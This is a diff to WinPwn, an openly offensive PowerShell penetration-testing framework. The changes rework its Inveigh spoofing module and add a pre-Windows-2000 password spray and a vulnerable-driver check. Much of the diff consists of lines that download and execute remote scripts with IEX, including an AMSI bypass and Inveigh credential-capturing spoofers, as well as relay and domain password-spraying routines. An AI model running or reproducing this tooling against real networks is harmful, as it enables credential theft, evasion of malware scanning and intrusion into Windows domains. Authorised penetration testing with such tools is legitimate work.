@@ -330,8 +330,6 @@ function Inveigh {
     
     if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
     {
-        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
-        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/WinPwn/master/WinPwn.ps1'');WinPwn -repo $S3cur3Th1sSh1t_repo;}'
         $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
         $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
         $Wcl = new-object System.Net.WebClient
@@ -347,31 +345,16 @@ function Inveigh {
         Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
     }
     
-    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
-    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
-    {   
-        if (isadmin)
-        {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-    }
-        else 
-        {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-      }
-    }
-    else
+    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/PowerSharpPack/master/PowerSharpBinaries/Invoke-Inveigh.ps1")
+    if (isadmin)
     {
-        if (isadmin)
-        {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-		
-        }
-        else 
-        {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
-	       
-        }
-    }
+            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER Y -ICMPv6 Y -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
+	}
+    else 
+    {
+            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER N -ICMPv6 N -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
+	}
+    
 }
 
 
@@ -1380,7 +1363,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
         Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
         Write-Host -ForegroundColor Green '9. Search for any .NET binary file in a share! '
-        Write-Host -ForegroundColor Green '10. Go back '
+	Write-Host -ForegroundColor Green '10. Search for vulnerable drivers (check against loldrivers.io)'
+        Write-Host -ForegroundColor Green '11. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1395,9 +1379,38 @@ __        ___       ____
              7{sensitivefiles}
              8{morerecon}
              9{dotnetsearch}
+	     10{vulnerabledrivers}
        }
     }
-  While ($masterquestion -ne 10)
+  While ($masterquestion -ne 11)
+}
+
+function vulnerabledrivers
+{
+
+# Simple script to check drivers in C:\windows\system32\drivers against the loldrivers list
+# Author: Oddvar Moe - @oddvar.moe
+
+$drivers = get-childitem -Path c:\windows\system32\drivers
+$web_client = new-object system.net.webclient
+$loldrivers = $web_client.DownloadString("https://www.loldrivers.io/api/drivers.json") | ConvertFrom-Json
+
+Write-output("Checking {0} drivers in C:\windows\system32\drivers against loldrivers.io json file" -f $drivers.Count)
+foreach ($lol in $loldrivers.KnownVulnerableSamples)
+{
+    # Check for matching driver name
+    if($drivers.Name -contains $lol.Filename)
+    {
+        #CHECK HASH
+        $Hash = Get-FileHash -Path "c:\windows\system32\drivers\$($lol.Filename)"
+        if($lol.Sha256 -eq $Hash.Hash)
+        {
+            write-output("The drivername {0} is vulnerable with a matching SHA256 hash of {1}" -f $lol.Filename, $lol.SHA256)
+	    write-output("The drivername {0} is vulnerable with a matching SHA256 hash of {1}" -f $lol.Filename, $lol.SHA256) >> "$currentPath\Vulnerabilities\vulnerabledrivers.txt"
+        }
+    }
+}
+
 }
 
 function Generalrecon{
@@ -2285,7 +2298,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '27. Enumerate ADCS Template informations and permissions via Certify!'
         Write-Host -ForegroundColor Green '28. Check LDAP/LDAPS Signing and or Channel Binding'
         Write-Host -ForegroundColor Green '29. (Ab)use some SCCM stuff'
-        Write-Host -ForegroundColor Green '30. Go back '
+	Write-Host -ForegroundColor Green '30. Spray pre2k passwords'
+        Write-Host -ForegroundColor Green '31. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2321,9 +2335,10 @@ __        ___       ____
          27{Invoke-ADCSTemplateRecon}
          28{LDAPChecksMenu}
          29{SCCMMenu}
+	 30{Domainpassspray -pre2k}
        }
     }
-  While ($masterquestion -ne 30)
+  While ($masterquestion -ne 31)
 }
 
 function SCCMMenu
@@ -4365,12 +4380,25 @@ function Domainpassspray
     [Switch]
         $usernameaspassword,
         [String]
-        $password   
-    )
+        $password,   
+    [Switch]
+        $pre2k
+)
+    
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+
+    if($pre2k)
+    {
+        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Pre2kSpray.ps1')
+	if(!$consoleoutput){Invoke-Pre2kSpray -Force -outfile $currentPath\Exploitation\Pre2kPasswords.txt}
+	else
+	{
+	  Invoke-Pre2kSpray -Force
+	}
+    }
     
     if ($emptypasswords)
     {
